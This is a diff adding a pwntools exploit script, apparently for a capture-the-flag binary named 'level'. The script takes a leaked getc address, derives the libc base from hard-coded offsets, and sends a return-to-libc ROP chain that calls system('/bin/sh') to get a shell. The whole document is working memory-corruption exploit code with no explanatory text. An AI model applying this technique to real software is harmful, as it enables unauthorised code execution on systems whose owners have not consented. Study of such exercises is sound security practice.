@@ -1,0 +1,25 @@
+#!/usr/bin/env python2
+
+from pwn import *
+
+target = process("./level")
+target.readuntil("0x")
+getc_addr = int("0x"+target.readline().strip(), 16)
+
+print "getc located at: ", hex(getc_addr)
+
+#for vm -- be sure to find offsets for your machine
+offset_system = 0x00000000000410b0
+offset_str_bin_sh = 0x16a153
+offset_getc = 0x00000000000712e0
+offset_gadget1 = 0x000000000001fe4a 
+
+libc_base = getc_addr-offset_getc
+
+buffor = "A"*(1+8)+p64(libc_base+offset_gadget1)+p64(libc_base+offset_str_bin_sh)+p64(libc_base+offset_system)
+
+target.interactive()
+target.clean()
+target.sendline(str(len(buffor)))
+target.send(buffor)
+target.interactive()
